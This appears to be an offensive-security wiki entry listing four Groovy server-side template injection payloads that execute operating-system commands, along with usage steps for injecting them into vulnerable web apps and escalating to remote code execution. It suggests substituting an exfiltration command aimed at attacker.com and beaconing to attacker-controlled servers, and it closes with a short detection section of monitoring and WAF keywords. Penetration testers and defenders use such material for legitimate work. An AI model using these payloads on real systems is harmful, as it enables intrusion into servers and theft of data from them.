---
id: 5c9d9824-fe19-4a4d-8466-d2f79612a535
type: code
language: groovy
verified: true
created_at: '2023-04-06T03:56:39.203503+00:00'
updated_at: '2023-04-10T20:23:42.787423+00:00'
tags:
  - groovy
  - rce
  - ssti
  - payload
platforms:
  - Web
  - Java
  - Windows
validated: true
---

# Groovy-Command-Execution-Payloads

## Code

```groovy
${T(java.lang.Runtime).getRuntime().exec("calc.exe")}
${'calc.exe'.execute()}
${this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe")}
${new GroovyShell().evaluate("'calc.exe'.execute()")}
```

## Description

This Groovy code snippet contains multiple payloads for achieving remote command execution via Server-Side Template Injection (SSTI) in vulnerable web applications using Groovy templating. Each variant leverages different Groovy features to spawn OS processes: `Runtime.exec()` for direct JVM process creation, `String.execute()` for simplified command invocation, class reflection for bypassing restrictions, and `GroovyShell.evaluate()` for script execution. These are injected into template expressions (e.g., `${payload}`) to run arbitrary commands on the server, such as launching calc.exe on Windows to demonstrate RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command String (e.g., "calc.exe") | The OS command to execute; replace with target-specific commands like "whoami" or "curl http://attacker.com/exfil" | "calc.exe" |

## Usage

Inject these payloads into user-controlled template inputs in Groovy-based web apps (e.g., Grails forms or dynamic pages). Start with simple tests like `${7*7}` to confirm SSTI, then escalate to these for RCE. For out-of-band confirmation, use commands that beacon to attacker-controlled servers. Deliver via HTTP POST/GET requests; use a proxy to iterate on payloads if initial attempts fail due to filtering.

## Detection

- Monitor web application logs for Groovy evaluation errors or unusual `${}` patterns in inputs.
- Track unexpected process spawns (e.g., calc.exe without user interaction) via Sysmon or EDR on Windows servers.
- WAF rules for keywords like "exec", "Runtime", or "GroovyShell"; anomaly detection in template rendering times.
- Network monitoring for command-induced callbacks (e.g., DNS queries or HTTP to external IPs).

## Related

- [[procedures/Groovy-Server-Side-Template-Injection-for-Command-Execution]]
